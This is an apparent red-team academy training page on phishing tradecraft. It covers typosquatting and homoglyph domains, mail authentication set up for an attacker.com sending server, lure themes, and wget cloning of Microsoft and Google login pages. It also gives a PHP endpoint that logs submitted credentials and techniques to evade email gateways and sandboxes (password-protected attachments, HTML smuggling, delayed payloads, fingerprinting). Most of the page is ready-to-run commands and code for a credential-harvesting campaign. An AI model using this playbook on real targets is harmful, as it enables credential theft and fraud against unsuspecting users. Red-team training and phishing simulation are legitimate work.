---
layout: training-page
title: "Phishing Tradecraft — Red Team Academy"
module: "Social Engineering"
tags:
  - phishing
  - social-engineering
  - infrastructure
  - initial-access
page_key: "se-phishing-tradecraft"
render_with_liquid: false
---

# Phishing Tradecraft

Phishing tradecraft covers the infrastructure, lure design, and delivery techniques that make phishing campaigns effective and hard to block. This page focuses on the craft and evasion; for tooling see GoPhish and Evilginx pages.

## Infrastructure Setup

### Domain Selection

```
# Typosquatting techniques
contoso.com       → cont0so.com, contos0.com, cntoso.com
microsoft.com     → microsofft.com, micosoft.com

# Lookalike domains
contoso.com       → contoso-support.com, contoso-helpdesk.com
                    login-contoso.com, contoso.com.attacker.com

# IDN homograph (Unicode lookalikes)
# а (Cyrillic) looks identical to a (Latin)
paypal.com        → pаypal.com  (Cyrillic а)

# Domain aging — buy 30+ days before use to avoid newness flags
# Use aged domains or purchase expired domains with history
```

### Email Authentication (Required)

```
# SPF — authorize your sending IP
_spf.attacker.com TXT "v=spf1 ip4:1.2.3.4 -all"

# DKIM — sign outgoing mail
# Generate keypair, publish public key in DNS
opendkim-genkey -t -s mail -d attacker.com
# DNS: mail._domainkey.attacker.com TXT "v=DKIM1; k=rsa; p=<pubkey>"

# DMARC — required to pass corporate spam filters
_dmarc.attacker.com TXT "v=DMARC1; p=none; rua=mailto:dmarc@attacker.com"

# Check your configuration
swaks --to target@corp.com --from support@attacker.com \
  --server mail.attacker.com --auth LOGIN \
  --header "Subject: Test" --body "Test"

# Score your email before sending
# mail-tester.com, mxtoolbox.com/emailhealth
```

### Mail Server Options

```
GoPhish         — purpose-built phishing server (tracking built in)
Postfix + DKIM  — manual setup, full control
Mailgun/SendGrid — commercial relay (risky — TOS violations, logging)
Amazon SES      — reliable deliverability, requires domain verification
```

## Lure Design

### High-Converting Lure Themes

```
Password expiry         — "Your password expires in 24 hours"
MFA enrollment          — "Action required: enroll in MFA by Friday"
Shared document         — "John Smith shared a document with you" (O365/Google)
Voicemail notification  — "You have a new voicemail" (with audio file attachment)
Package delivery        — "Your package could not be delivered" (FedEx/UPS/Amazon)
Payroll / benefits      — "Your W-2 is ready" / "Benefits enrollment closes today"
Security alert          — "Suspicious sign-in detected from [target's city]"
IT ticket update        — "Your ticket #INC-48821 has been updated"
```

### HTML Lure Cloning

```
# Clone legitimate pages with HTTrack or wget
wget --mirror --convert-links --page-requisites \
  -P ./clone https://login.microsoftonline.com/

# Or use GoPhish's built-in site importer
# GoPhish > Landing Pages > Import Site

# Modify the form action to point to your credential capture endpoint
# Remove/replace tracking pixels from the original
```

### Attachment Lures

```
Macro-enabled Office docs (.docm, .xlsm)
   — "Enable content" to view document
   — Use with VBA macro shellcode loaders

ISO / IMG files
   — Bypasses Mark-of-the-Web (MOTW) on older Windows
   — Embed LNK file that executes payload

PDF with embedded link
   — "Click here to view the full document"
   — Lower detection than direct Office macros

HTML smuggling
   — Payload assembled in browser via JavaScript blobs
   — Bypasses email gateway scanning entirely
   — See: evasion/html-smuggling
```

## Bypassing Email Security

```
# Common email security layers to bypass:
# - SEG (Secure Email Gateway): Proofpoint, Mimecast, Defender for O365
# - URL rewriting / sandboxing
# - Attachment sandboxing

# Techniques:
# 1. Password-protect attachments (bypasses sandbox analysis)
#    Send password in the email body — humans can use it, sandboxes usually can't

# 2. HTML smuggling (payload never in email body/attachment)

# 3. Redirect chains — link to legitimate site (Google, Bing) that redirects
#    https://www.google.com/url?q=https://attacker.com/

# 4. Abuse legitimate services
#    SharePoint, OneDrive, Dropbox, GitHub — host payload on trusted platform

# 5. Delayed payload — payload page returns 404 at scan time, activates later

# 6. Browser fingerprinting on landing page
#    Only serve payload to targets with matching user-agent / IP range
```

## Tracking & Metrics

```
# GoPhish auto-tracks:
# - Email opened (1x1 pixel beacon)
# - Link clicked (redirect through GoPhish server)
# - Credentials submitted (form capture)

# Custom tracking pixel
<img src="https://track.attacker.com/open/{{.RId}}" width="1" height="1" />

# Per-target unique links
https://attacker.com/verify?token=<unique-per-target-token>

# Key metrics to report
Click rate          = clicks / sent
Submission rate     = submissions / clicks
Time-to-first-click = timestamp of first click - send time
```

## Operational Security

```
# Separate infrastructure per campaign
# Never reuse phishing domains across engagements
# Use redirectors — phishing domain → redirector → credential capture server
# Strip identifying headers from outbound mail
# Use HTTPS on landing pages (Let's Encrypt)
# Rotate infrastructure if campaign is burned

# Check if your domain is blocked before sending
curl -s "https://transparencyreport.google.com/safe-browsing/search?url=attacker.com"
mxtoolbox.com/blacklists — check MX/IP blacklists
```

---

## Domain Selection and Registration: Deep Dive

### Typosquatting Methodology

```bash
# Generate typosquatting variations programmatically
# Tool: dnstwist (github.com/elceef/dnstwist)
pip3 install dnstwist

dnstwist --registered target.com
# Shows all typosquatted variants that are already registered
# and those still available

# Output includes: bitsquatting, homoglyphs, transposition,
# omission, addition, replacement, subdomain variations

# Filter for available domains:
dnstwist --registered --format csv target.com | grep AVAILABLE
```

### Homoglyph Domain Generation

```python
# Homoglyph characters that look identical in most fonts
# (using Unicode lookalikes)

homoglyphs = {
    'a': ['а', 'а'],   # Cyrillic small a
    'e': ['е'],         # Cyrillic small e
    'o': ['о'],         # Cyrillic small o
    'p': ['р'],         # Cyrillic small p (looks like Latin p)
    'c': ['с'],         # Cyrillic small c
    'x': ['х'],         # Cyrillic small kha
}

# Example: paypal.com with Cyrillic 'a' in position 1
# Register via Namecheap (supports IDN/punycode domains)
# Browser displays as paypal.com but actual domain is xn--pypal-4vd.com
```

### Aged Domain Acquisition

```
# Option 1: Expired domain with existing reputation
# Sites: expireddomains.net, domcop.com, SpamHaus-checked domains
# Look for:
#   - Domain age > 2 years
#   - Not on any spam/blocklists
#   - Has historical content (check Wayback Machine)
#   - Category matches your pretext (tech support, finance, etc.)

# Option 2: Purchase aged domain from a broker
# Marketplaces: Sedo, Afternic, GoDaddy Auctions

# Option 3: Dormant parked domains
# Many registered domains are unused — check whois for registration date
# Offer to buy via the registrar or contact the owner

# Check domain reputation before purchase:
# mxtoolbox.com/blacklists
# virustotal.com/gui/domain/<domain>
# Google Safe Browsing API
```

---

## Full SPF / DKIM / DMARC Setup Walkthrough

### Step 1: VPS and DNS Setup

```bash
# Provision a VPS with a clean IP
# Recommended: Vultr, Hetzner, DigitalOcean
# Avoid: AWS/GCP/Azure — their IP ranges are commonly flagged
# Check IP reputation before use:
curl https://api.abuseipdb.com/api/v2/check \
  -G --data-urlencode "ipAddress=1.2.3.4" \
  -H "Key: YOUR_API_KEY" -H "Accept: application/json"

# Set reverse DNS (PTR record) to match your mail domain
# Done in VPS control panel: set rDNS for the IP to mail.attacker.com
# This is checked by many receiving mail servers

# DNS records to configure at your registrar:
# A record:   attacker.com        → 1.2.3.4
# A record:   mail.attacker.com   → 1.2.3.4
# MX record:  attacker.com        → 10 mail.attacker.com
```

### Step 2: SPF Record

```bash
# SPF authorizes which IPs can send email for your domain
# Add as TXT record:
# attacker.com  TXT  "v=spf1 ip4:1.2.3.4 mx ~all"

# Flags:
# ip4:1.2.3.4  — explicitly authorize your server IP
# mx           — also authorize anything in MX record
# ~all         — softfail anything else (mark as suspicious but deliver)
# -all         — hardfail anything else (reject)

# Verify SPF:
dig TXT attacker.com | grep spf
# Or: mxtoolbox.com/spf.aspx
```

### Step 3: DKIM Setup with Postfix

```bash
# Install opendkim
sudo apt update && sudo apt install opendkim opendkim-tools

# Generate keypair for your domain
sudo mkdir -p /etc/opendkim/keys/attacker.com
sudo opendkim-genkey -t -s mail -d attacker.com \
  -D /etc/opendkim/keys/attacker.com/

# Keys created:
# /etc/opendkim/keys/attacker.com/mail.private  (keep secret)
# /etc/opendkim/keys/attacker.com/mail.txt       (publish in DNS)

# View the DNS record to add:
cat /etc/opendkim/keys/attacker.com/mail.txt

# Add as TXT record:
# mail._domainkey.attacker.com  TXT  "v=DKIM1; k=rsa; p=<pubkey>"

# Configure /etc/opendkim.conf:
Domain                  attacker.com
KeyFile                 /etc/opendkim/keys/attacker.com/mail.private
Selector                mail
Socket                  inet:12301@localhost

# Configure Postfix to use OpenDKIM (/etc/postfix/main.cf):
# milter_default_action = accept
# milter_protocol = 6
# smtpd_milters = inet:localhost:12301
# non_smtpd_milters = inet:localhost:12301

sudo systemctl restart opendkim postfix

# Verify DKIM is signing:
swaks --to test@mail-tester.com --from noreply@attacker.com \
  --server localhost
# Then check mail-tester.com results
```

### Step 4: DMARC Record

```bash
# DMARC tells receivers what to do with SPF/DKIM failures
# And provides aggregate reporting back to you

# Minimum DMARC (monitoring mode — no enforcement):
# _dmarc.attacker.com  TXT  "v=DMARC1; p=none; rua=mailto:dmarc@attacker.com"

# Enforcement (use only once SPF and DKIM are confirmed working):
# p=quarantine — send failures to spam folder
# p=reject      — reject SPF/DKIM failures entirely

# For phishing ops: p=none is fine
# The real value is ensuring your OWN mail passes the checks

# Verify DMARC:
dig TXT _dmarc.attacker.com
# Or: mxtoolbox.com/dmarc.aspx
```

---

## Mail Server Configuration: Postfix + GoPhish

```bash
# Install Postfix
sudo apt install postfix
# Choose "Internet Site" during setup
# Set mail name to your domain (attacker.com)

# /etc/postfix/main.cf — key settings:
# myhostname = mail.attacker.com
# mydomain = attacker.com
# myorigin = $mydomain
# inet_interfaces = all
# inet_protocols = ipv4
# mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain
# relayhost =   (empty — send directly)
# smtpd_tls_cert_file = /etc/letsencrypt/live/mail.attacker.com/fullchain.pem
# smtpd_tls_key_file = /etc/letsencrypt/live/mail.attacker.com/privkey.pem
# smtpd_use_tls = yes

# Get TLS certificate with Let's Encrypt
sudo apt install certbot
sudo certbot certonly --standalone -d mail.attacker.com

# Point GoPhish to your Postfix server
# GoPhish Sending Profile:
# SMTP From: noreply@attacker.com
# Host: localhost:25
# Username: (blank for local Postfix)
# Password: (blank)
# Ignore Certificate Errors: false (your cert is valid)

# IP warm-up (important for deliverability)
# New IPs are distrusted — send low volume first
# Day 1-3: 50 emails/day
# Day 4-7: 200 emails/day
# Day 8-14: 500 emails/day
# After 2 weeks: scale up
# Monitor bounces and complaints in Postfix mail logs: /var/log/mail.log
```

---

## HTML Email Design: Cloning Corporate Emails

```bash
# Clone a real corporate email template
# Start with a real email from the target organisation (if available)
# Or: download official email templates from company brand assets page

# Key cloning steps:
# 1. Extract HTML source from a real email (View Source in mail client)
# 2. Host all images on your infrastructure (inline base64 or external CDN)
# 3. Replace all links with your tracking links / landing page URLs
# 4. Add GoPhish variable substitution: {{.FirstName}}, {{.URL}}, {{.Email}}
# 5. Add tracking pixel (GoPhish does this automatically)
# 6. Test render in: Gmail, Outlook, Apple Mail (use litmus.com or emailonacid.com)

# Common pitfalls:
# - Broken image references (images hosted on original domain)
# - CSS that renders differently in Outlook (Outlook uses Word rendering engine)
# - Links that still point to the original site
# - Missing or broken mobile stylesheet

# Example tracking pixel snippet (GoPhish template variable):
# <img src="{{.TrackingURL}}" width="1" height="1" alt="" style="display:none;" />
```

---

## Landing Page Creation

### Credential Harvesting: Static Clone

```bash
# Clone the login page
wget --mirror --convert-links --adjust-extension --page-requisites \
  -P ./clone https://accounts.google.com/signin/v2/identifier

# Or use GoPhish's Import Site feature (simpler)

# Modify the form action to POST to your capture endpoint:
# <form method="POST" action="/capture">

# Simple PHP capture endpoint:
cat > /var/www/html/capture.php << 'EOF'
<?php
$logfile = '/var/www/captures.log';
$data = date('Y-m-d H:i:s') . ' | ' . $_SERVER['REMOTE_ADDR'] . ' | ';
foreach ($_POST as $key => $value) {
    $data .= $key . '=' . $value . ' | ';
}
file_put_contents($logfile, $data . "\n", FILE_APPEND);
// Redirect to real site (complete the login experience)
header('Location: https://accounts.google.com');
exit;
EOF
```

### Evilginx AiTM vs Static Page

```
Static credential page:
  + Simple to set up
  + Fully controlled — no dependencies
  - Captures credentials only (password in plaintext)
  - Does not capture session cookies
  - Defeated by MFA (attacker has creds but not active session)
  - Requires manual replay

Evilginx AiTM (Adversary-in-the-Middle):
  + Captures credentials AND authenticated session cookies
  + Works against SMS OTP, TOTP, push MFA (not FIDO2)
  + Automated — session extracted immediately
  + Target completes real authentication flow (more convincing)
  - More complex setup (DNS, TLS, phishlets required)
  - Phishlets need updating when target site changes
  - May trigger suspicious activity detection on the target's real account

Recommendation:
  For engagements where MFA bypass is in scope → use Evilginx
  For credential capture only (simulation) → GoPhish + static page is sufficient
```

---

## Phishing Simulation Platforms Comparison

| Platform | Type | Strengths | Limitations |
|---|---|---|---|
| GoPhish | Open source | Free, full-featured, API, self-hosted | No AiTM, manual reporting |
| Evilginx | Open source | AiTM, MFA bypass, session capture | Complex setup, no campaign dashboard |
| Lucy Security | Commercial | Enterprise features, LMS integration, compliance | Expensive ($$$) |
| KnowBe4 | Commercial SaaS | Huge template library, training integration | SaaS — data leaves org |
| Proofpoint ThreatSim | Commercial SaaS | Enterprise-grade, Proofpoint integration | Expensive, less flexible |
| PhishER (KnowBe4) | Commercial | Response automation, SOAR integration | Add-on cost |
| Cofense PhishMe | Commercial SaaS | Large template library, good reporting | Enterprise pricing |
| Modlishka | Open source | AiTM capability, flexible proxy | Less maintained, no campaign UI |

---

## Resources

- GoPhish — `github.com/gophish/gophish`
- Evilginx — AiTM credential capture — `github.com/kgretzky/evilginx2`
- mail-tester.com — spam score checker
- dnstwist — typosquatting detection/generation — `github.com/elceef/dnstwist`
- Phishing Frenzy — campaign management — `github.com/pentestgeek/phishing-frenzy`
- MITRE T1566 — Phishing — `attack.mitre.org/techniques/T1566/`
- Let's Encrypt — free TLS certificates — `letsencrypt.org`
- MXToolbox — email diagnostics — `mxtoolbox.com`
- expireddomains.net — aged domain search
